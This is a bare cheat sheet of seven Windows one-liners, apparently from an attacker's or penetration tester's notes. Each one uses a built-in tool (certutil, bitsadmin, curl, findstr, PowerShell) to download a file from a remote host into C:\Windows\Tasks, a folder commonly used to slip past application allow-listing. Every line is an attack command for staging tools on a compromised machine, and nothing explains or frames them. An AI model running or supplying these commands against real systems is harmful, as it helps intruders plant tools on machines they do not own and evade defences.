## [bestand]
certutil -urlcache -split -f http://[ip]/tools/[bestand] [bestand]
cmd.exe /c curl http://[ip]/tools/[bestand] -o C:\Windows\Tasks\[bestand]
bitsadmin /create 1 bitsadmin /addfile 1 http://[ip]/tools/[bestand] c:\\windows\\tasks\[bestand] bitsadmin /RESUME 1 bitsadmin /complete 1
findstr /V /L W3AllLov3LolBas \\\\[ip]\share\\tools\[bestand] > c:\windows\\tasks\[bestand]
powershell iwr -uri http://[ip]/tools/[bestand] -o c:\windows\\tasks\[bestand]
powershell wget http://[ip]/tools/[bestand] -o c:\windows\\tasks\[bestand]
powershell -c (new-object System.Net.WebClient).DownloadFile('http://[ip]/tools/[bestand]','c:\\windows\\tasks\[bestand]')